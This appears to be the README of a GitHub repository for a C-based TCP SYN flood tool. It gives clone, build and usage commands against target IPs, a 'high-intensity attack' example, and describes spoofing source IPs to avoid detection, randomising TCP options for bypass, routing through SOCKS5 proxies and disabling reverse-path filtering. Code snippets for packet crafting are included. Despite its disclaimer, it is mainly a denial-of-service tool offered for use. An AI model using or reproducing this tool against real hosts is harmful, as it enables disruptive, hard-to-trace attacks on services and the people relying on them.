# TCP SYN Flood Tool

A high-performance TCP SYN flood tool written in C, designed for network stress testing and research purposes. This tool generates spoofed TCP SYN packets with random TCP options to test network infrastructure resilience.

## ⚠️ DISCLAIMER

**This tool is for educational and authorized testing purposes only.** Unauthorized use against systems you do not own or have explicit permission to test is illegal and may result in criminal prosecution. The authors and contributors are not responsible for any misuse of this software.

## Features

- **Raw Socket Implementation**: Uses raw sockets for direct packet crafting at the kernel level
- **IP Spoofing**: Generates spoofed source IPs from various network ranges
- **Random TCP Options**: Implements MSS, Window Scale, Timestamp, and SACK_PERM options for enhanced bypass
- **Multi-threading**: Supports up to 10,000 concurrent threads for maximum throughput
- **Rate Limiting**: Built-in rate limiter for controlled packet generation
- **SOCKS5 Proxy Support**: Optional proxy support for routing traffic through SOCKS5 proxies
- **Connection State Tracking**: Maintains connection state for realistic packet sequences
- **Real-time Statistics**: Live monitoring of packets per second (PPS), bandwidth, and connection stats
- **Optimized Performance**: Efficient memory management and socket pooling

## Requirements

- **Operating System**: Linux (tested on Ubuntu 20.04+, Debian 10+, CentOS 7+)
- **Privileges**: Root access required (for raw sockets)
- **Compiler**: GCC with C99 support
- **Libraries**: pthread (usually included with glibc)
- **Kernel**: Linux kernel 2.6+ (for raw socket support)

## Installation

### Clone the Repository

```bash
git clone https://github.com/o-sudo-gif/tcp-syn-flood.git
cd tcp-syn-flood
```

### Compile

```bash
make
```

Or manually:

```bash
gcc -o syn syn.c -lpthread -O3 -Wall
```

### Install (Optional)

```bash
sudo make install
```

This will copy the binary to `/usr/local/bin/syn`.

## Usage

### Basic Syntax

```bash
sudo ./syn <target_ip> <target_port> <threads> <duration> <max_pps> [--socks5]
```

### Parameters

| Parameter     | Description                         | Example           |
|---------------|-------------------------------------|-------------------|
| `target_ip`   | Target server IP address            | `192.168.1.100`   |
| `target_port` | Target TCP port                     | `80`, `443`, `22` |
| `threads`     | Number of worker threads (1-10000)  | `300`             |
| `duration`    | Attack duration in seconds          | `60`              |
| `max_pps`     | Maximum packets per second          | `100000`          |
| `--socks5`    | (Optional) Enable SOCKS5 proxy mode | `--socks5`        |

### Examples

#### Basic SYN Flood

```bash
sudo ./syn 192.168.1.100 80 300 60 100000
```

This command:
- Targets `192.168.1.100:80`
- Uses 300 threads
- Runs for 60 seconds
- Limits to 100,000 packets per second

#### With SOCKS5 Proxies

1. Create a `socks5.txt` file with proxy list:
```
proxy1.example.com:1080:username:password
proxy2.example.com:1080
192.168.1.50:1080:user:pass
```

2. Run with proxy support:
```bash
sudo ./syn 192.168.1.100 443 500 120 200000 --socks5
```

#### High-Intensity Attack

```bash
sudo ./syn 10.0.0.1 22 1000 300 500000
```

**Warning**: High thread counts (>500) and PPS rates (>200k) may cause system instability.

## Working Logic

### Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│                    Main Process                         │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐   │
│  │ Thread Pool  │  │ Rate Limiter │  │ Stats Thread │   │
│  │ (1-10000)    │  │              │  │ (Monitoring) │   │
│  │              │  │              │  │              │   │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘   │
│         │                  │                  │         │
│         └──────────────────┼──────────────────┘         │
│                            │                            │
└────────────────────────────┼────────────────────────────┘
                             │
                ┌────────────┴────────────┐
                │                         │
         ┌──────▼──────┐          ┌───────▼──────┐
         │ Raw Socket  │          │ SOCKS5 Proxy │
         │  Mode       │          │   Mode       │
         │             │          │              │
         │ - IP Spoof  │          │ - Proxy      │
         │ - Direct    │          │   Rotation   │
         │   Packet    │          │ - HTTP/SSH   │
         │   Crafting  │          │   Payloads   │
         └─────────────┘          └──────────────┘
```

### Packet Generation Flow

1. **Initialization Phase**
   - Disables reverse path filtering (`rp_filter`)
   - Increases file descriptor limits
   - Loads SOCKS5 proxies (if enabled)
   - Creates worker thread pool

2. **Thread Execution**
   Each worker thread:
   - Creates up to 5,000 raw sockets
   - Generates spoofed source IPs
   - Maintains connection state tracking
   - Crafts TCP SYN packets with:
     - Variable TCP header length (20-60 bytes)
     - Random TCP options (MSS, Window Scale, Timestamp, SACK_PERM)
     - No payload (pure SYN flood)
   - Calculates IP and TCP checksums
   - Sends packets via `sendto()` with `MSG_DONTWAIT`

3. **Packet Structure**

```
┌─────────────────────────────────────────────────────────┐
│ IP Header (20 bytes)                                    │
│ - Version: 4                                            │
│ - IHL: 5                                                │
│ - TTL: 64/128/255 (realistic distribution)              │
│ - Protocol: TCP (6)                                     │
│ - Source: Spoofed IP                                    │
│ - Destination: Target IP                                │
└─────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────┐
│ TCP Header (20-60 bytes)                                │
│ - Source Port: Random (1024-65535)                      │
│ - Destination Port: Target Port                         │
│ - Flags: SYN=1, ACK=0, FIN=0, RST=0, PSH=0, URG=0       │
│ - Sequence Number: Random/Calculated                    │
│ - Acknowledgment Number: 0 (SYN packets)                │
│ - Window Size: 8192-65535                               │
│ - Data Offset: 5-15 (variable)                          │
└─────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────┐
│ TCP Options (0-40 bytes)                                │
│ - MSS (4 bytes): 536, 1024, 1440, 1460, 1500            │
│ - Window Scaling (3 bytes): 0-14                        │
│ - Timestamp (10 bytes): Current time + random           │
│ - SACK_PERM (2 bytes)                                   │
│ - NOP padding (to align to 4-byte boundary)             │
└─────────────────────────────────────────────────────────┘
Total Packet Size: ~40-80 bytes (no payload)
```

4. **IP Spoofing Algorithm**

The tool generates spoofed IPs using a rotation algorithm:
- Uses thread ID, iteration count, and time as seed
- Distributes across 100 different IP class ranges
- Includes private ranges (10.x.x.x, 172.16-31.x.x, 192.168.x.x)
- Includes various public IP ranges for diversity
- Rotates IPs per packet to avoid detection

5. **Connection State Tracking**

For each unique (source_ip, source_port) pair:
- Maintains sequence numbers
- Tracks window size
- Stores consistent port per connection
- Uses hash table for O(1) lookup

6. **SOCKS5 Proxy Mode**

When `--socks5` flag is used:
- Loads proxies from `socks5.txt`
- Rotates through proxy list
- Establishes TCP connections through proxies
- Sends HTTP or SSH payloads (depending on target port)
- Tracks proxy failures and auto-rotates

### Key Algorithms

#### Checksum Calculation

```c
// IP Header Checksum
iph->check = 0;
iph->check = checksum_tcp_packet((unsigned short *) datagram, IP_HDR_LEN);

// TCP Checksum (with pseudo-header)
psh.source_address = spoofed_ip;
psh.dest_address = target_ip;
psh.tcp_length = TCP_TOTAL_LEN;
tcph->check = checksum_tcp_packet((unsigned short*) pseudogram_buffer, PSEUDO_SIZE);
```

#### Sequence Number Generation

```c
// Base sequence from time and thread ID
uint32_t base_seq = (time_base * 2500000) + (thread_id * 100000000) + random(10000000, 500000000);

// Increment per connection
seq_val = base_seq + random(1000000, 5000000);
```

#### TCP Options Generation

```c
// Randomly include options based on probability
if (opt_choice < 90) {
    // 90% include MSS
    tcp_options[offset++] = TCP_OPT_MSS;
    tcp_options[offset++] = 4;
    // MSS value: 536, 1024, 1440, 1460, 1500
}

if (opt_choice < 70) {
    // 70% include Window Scale
    tcp_options[offset++] = TCP_OPT_WINDOW;
    tcp_options[offset++] = 3;
    // Scale: 0-14
}

if (opt_choice < 80) {
    // 80% include Timestamp
    tcp_options[offset++] = TCP_OPT_TIMESTAMP;
    tcp_options[offset++] = 10;
    // Timestamp values
}
```

## Technical Details

### Performance Characteristics

- **Throughput**: Up to 500,000+ PPS (depending on hardware)
- **Latency**: Sub-millisecond packet generation
- **Memory**: ~50MB per 1000 threads
- **CPU**: Multi-core utilization via pthreads

### Socket Configuration

- **Raw Sockets**: `PF_INET, SOCK_RAW, IPPROTO_TCP`
- **Buffer Sizes**: 256MB send/recv buffers
- **Non-blocking**: All sockets use `O_NONBLOCK`
- **IP_HDRINCL**: Enabled for manual IP header construction

### Thread Safety

- Atomic operations for counters (`__sync_add_and_fetch`)
- Thread-local storage for connection states
- Cleanup handlers for graceful shutdown

## Statistics Output

The tool provides real-time statistics:

```
[LIVE] PPS: 125000 | Sent: 7500000 | Failed: 1250 | Mbps: 10.00
```

- **PPS**: Packets per second
- **Sent**: Total packets sent
- **Failed**: Failed send attempts
- **Conn**: Active proxy connections (if using proxies)
- **ProxyFail**: Proxy connection failures
- **Mbps**: Estimated bandwidth usage

## Troubleshooting

### Permission Denied

```bash
# Ensure running as root
sudo ./syn <target> <port> <threads> <duration> <pps>
```

### No Packets Sent

1. Check if reverse path filtering is disabled:
```bash
cat /proc/sys/net/ipv4/conf/all/rp_filter
# Should be 0
```

2. Verify network interface:
```bash
ip link show
```

3. Check firewall rules:
```bash
iptables -L -n
```

### Low Performance

1. Increase thread count (if CPU allows)
2. Increase `max_pps` limit
3. Check system limits:
```bash
ulimit -n
# Should be high (1048576+)
```

4. Monitor system resources:
```bash
htop
# Watch CPU and memory usage
```

### SOCKS5 Proxy Issues

1. Verify proxy format in `socks5.txt`:
```
ip:port
ip:port:username:password
```

2. Test proxy connectivity:
```bash
curl --socks5 proxy_ip:port http://example.com
```

3. Check proxy authentication (if required)

## Build Options

### Debug Build

```bash
gcc -o syn syn.c -lpthread -g -Wall -DDEBUG
```

### Optimized Build (Default)

```bash
gcc -o syn syn.c -lpthread -O3 -march=native
```

### Static Build

```bash
gcc -o syn syn.c -lpthread -static -O3
```

## File Structure

```
.
├── syn.c              # Main source code
├── README.md          # This file
├── Makefile           # Build configuration
├── .gitignore         # Git ignore rules
└── socks5.txt         # SOCKS5 proxy list (optional)
```

## Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

## License

This project is provided "as-is" for educational purposes. Use at your own risk.

## References

- [RFC 793 - TCP Protocol](https://tools.ietf.org/html/rfc793)
- [RFC 1323 - TCP Extensions](https://tools.ietf.org/html/rfc1323)
- [Linux Raw Sockets](https://man7.org/linux/man-pages/man7/raw.7.html)
- [SOCKS5 Protocol](https://tools.ietf.org/html/rfc1928)

## Support

For issues and questions:
- Open an issue on GitHub
- Check existing issues for solutions
- Review the troubleshooting section

---

**Remember**: Only use this tool on systems you own or have explicit written permission to test. Unauthorized network attacks are illegal.

